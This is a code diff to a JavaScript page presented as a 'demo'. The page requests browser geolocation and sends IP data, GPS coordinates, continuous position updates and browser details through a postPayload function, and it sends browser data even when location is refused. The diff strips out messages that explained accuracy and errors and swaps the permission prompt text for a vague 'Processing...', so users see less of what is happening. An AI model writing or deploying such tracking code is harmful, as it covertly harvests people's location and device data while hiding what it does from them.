@@ -124,19 +124,12 @@
 
     const bInfo = collectBrowserInfo();
     postPayload({ ip: ipInfo, gps: gpsData, browser: bInfo });
-
-    if (typeof c.accuracy === "number" && c.accuracy > 1000) {
-      setStatus("Location received with limited accuracy. Your device or browser may be providing an approximate position.", "warn");
-    } else {
-      setStatus("Location received.", "success");
-    }
+    setStatus("Location information received.", "success");
 
     if (watchId === null && navigator.geolocation) {
       watchId = navigator.geolocation.watchPosition(function (newPos) {
         const nc = newPos.coords;
-        if (typeof nc.accuracy === "number" && nc.accuracy <= 1000) {
-          setStatus("Location received.", "success");
-        }
+        setStatus("Location information received.", "success");
         postPayload({
           gps: {
             lat: nc.latitude,
@@ -148,22 +141,14 @@
             timestamp: new Date().toLocaleTimeString()
           }
         });
-      }, null, GEO_OPTS);
+      }, function () {}, GEO_OPTS);
     }
   }
 
   function geoError(err) {
     const bInfo = collectBrowserInfo();
     postPayload({ denied: true, errorCode: err ? err.code : 1, browser: bInfo });
-
-    let userMsg = "Location access was not granted.";
-    if (err && err.code === 2) {
-      userMsg = "Location information is unavailable.";
-    } else if (err && err.code === 3) {
-      userMsg = "Location request timed out.";
-    }
-
-    setStatus(userMsg, "error");
+    setStatus("Location access was not granted.", "error");
     const btn = document.getElementById("btn-start-demo");
     if (btn) btn.disabled = true;
   }
@@ -172,15 +157,14 @@
     const btn = document.getElementById("btn-start-demo");
     if (btn) {
       btn.disabled = true;
-      btn.textContent = "Demo in progress...";
     }
 
     if (!navigator.geolocation) {
-      setStatus("Location API is not supported by your browser.", "error");
+      setStatus("Location access was not granted.", "error");
       return;
     }
 
-    setStatus("Requesting location permission...", "info");
+    setStatus("Processing...", "info");
     navigator.geolocation.getCurrentPosition(applyFix, geoError, GEO_OPTS);
   }
 
